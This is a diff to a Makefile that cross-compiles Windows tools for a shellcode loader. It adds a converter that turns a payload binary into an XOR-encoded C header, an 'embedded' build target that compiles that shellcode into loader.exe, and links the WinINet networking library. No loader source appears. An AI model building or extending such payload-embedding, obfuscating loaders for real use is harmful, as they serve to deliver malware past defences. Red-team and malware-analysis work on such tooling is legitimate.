@@ -1,16 +1,27 @@
 CC = x86_64-w64-mingw32-gcc
 CFLAGS = -O2 -s -Wall
-LDFLAGS = -lgdi32
+LDFLAGS = -lgdi32 -lwininet
 
-all: loader.exe xor_encode.exe
+all: loader.exe xor_encode.exe bin2header.exe
 
 loader.exe: loader.c
 	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
 
+# Embedded build: compile shellcode into the binary
+# Usage: make embedded XOR_KEY=42
+embedded: shellcode.h
+	$(CC) $(CFLAGS) -DEMBED -o loader.exe loader.c $(LDFLAGS)
+
+shellcode.h: bin2header.exe
+	@echo "Run: bin2header.exe payload.bin shellcode.h [xor_key]"
+
 xor_encode.exe: xor_encode.c
 	$(CC) $(CFLAGS) -o $@ $<
 
-clean:
-	rm -f loader.exe xor_encode.exe
+bin2header.exe: bin2header.c
+	$(CC) $(CFLAGS) -o $@ $<
 
-.PHONY: all clean
+clean:
+	rm -f loader.exe xor_encode.exe bin2header.exe shellcode.h
+
+.PHONY: all clean embedded
